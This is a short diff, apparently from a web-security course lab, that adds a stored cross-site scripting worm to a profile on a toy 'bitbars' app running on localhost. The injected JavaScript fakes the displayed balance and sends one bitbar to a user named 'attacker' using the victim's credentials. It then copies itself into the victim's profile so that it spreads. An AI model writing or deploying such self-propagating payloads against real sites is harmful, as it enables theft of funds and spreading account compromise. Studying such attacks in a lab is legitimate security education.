@@ -1,0 +1,20 @@
+<span id="bitbars" class="
+      document.getElementById('bitbar_display').innerHTML = '10 bitbars'
+      var amp = String.fromCharCode(38)
+      var transferRequest = new XMLHttpRequest()
+      transferRequest.open('POST','http://localhost:3000/post_transfer', false)
+      transferRequest.withCredentials = true
+      transferRequest.setRequestHeader('Content-type','application/x-www-form-urlencoded')
+      var transferQuery = ''
+      transferQuery = transferQuery.concat('destination_username=attacker', amp, 'quantity=1')
+      transferRequest.send(transferQuery)
+      var profileRequest = new XMLHttpRequest()
+      profileRequest.open('POST','http://localhost:3000/set_profile', false)
+      profileRequest.withCredentials = true
+      profileRequest.setRequestHeader('Content-type','application/x-www-form-urlencoded')
+      var profileQuery = 'new_profile='
+      var profileString = document.getElementById('profile').innerHTML
+      profileRequest.send(profileQuery.concat(profileString))
+">
+</span>
+<strong>Bryan and Conrad and my heroes.</strong>
